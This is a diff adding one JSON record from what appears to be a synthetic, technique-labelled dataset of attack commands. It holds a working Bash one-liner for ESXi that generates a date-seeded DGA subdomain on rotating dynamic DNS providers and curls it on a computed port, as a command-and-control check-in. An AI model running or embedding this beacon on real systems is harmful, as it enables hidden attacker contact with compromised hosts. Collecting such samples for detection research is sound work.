@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "s=$(date -u +%G%V%u); sub=$(echo -n \"$s\" | md5sum | cut -c1-14); providers=(hopto.org sytes.net zapto.org ddns.net); dom=\"$sub.${providers[$(($(date -u +%u)%${#providers[@]}))]}\"; port=$(( 49152 + ($(date -u +%M) * 13 % 16383) )); curl --connect-timeout 6 \"https://$dom:$port/check\"",
+  "explanation": "Uses ISO week/day to drive a DGA label and rotates among different dynamic DNS providers with a computed high-ephemeral port. This leverages dynamic DNS resolution per T1568.",
+  "rationale_steps": [
+    "Build a weekly seed and hash to generate the subdomain.",
+    "Rotate provider domain based on day of week.",
+    "Choose a high ephemeral port from a formula.",
+    "Connect via curl to the dynamic domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-3af16eca",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
